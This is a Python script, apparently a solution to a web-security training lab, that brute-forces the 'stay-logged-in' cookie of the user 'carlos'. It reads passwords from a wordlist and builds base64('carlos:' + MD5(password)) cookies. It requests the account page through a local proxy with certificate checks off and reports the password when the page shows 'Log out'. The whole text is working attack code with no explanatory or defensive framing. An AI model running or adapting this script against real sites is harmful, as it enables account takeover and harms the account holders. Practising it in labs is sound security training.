import requests, sys, urllib3, hashlib, base64
import time as t
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def access_carlos_account(url):

    print("[+] Brute-forcing Carlos's password with this flow [base64(username:md5(password)]")
    with open('Password.txt', 'r') as file:
        for pwd in file:
            hashed_pwd = 'carlos:' + hashlib.md5(pwd.rstrip('\r\n').encode("utf-8")).hexdigest()
            encoded_pwd = base64.b64encode(bytes(hashed_pwd, "utf-8"))
            str_pwd = encoded_pwd.decode("utf-8")
            print("[@] Test Username:password ==> carlos:" + pwd)
            
            # perform the request
            r  = requests.Session()
            myaccount_url = url + "/my-account?id=carlos"
            cookies = {'stay-logged-in': str_pwd}
            req = r.get(myaccount_url, cookies=cookies, verify=False, proxies=proxies)
            t.sleep(0.1)
            if "Log out" in req.text:
                print("[+] Carlos's password is: " + pwd)
                sys.exit(-1)
        print("[-] Could not find Carlos's password.")

def main():
    if len(sys.argv) != 2 :
        print(f"[+] Usage: {sys.argv[0]} <url>")
        print(f"[+] Example: {sys.argv[0]} www.example.com")
        sys.exit(-1)

    url = sys.argv[1]
    access_carlos_account(url)


if __name__ == "__main__":
    main()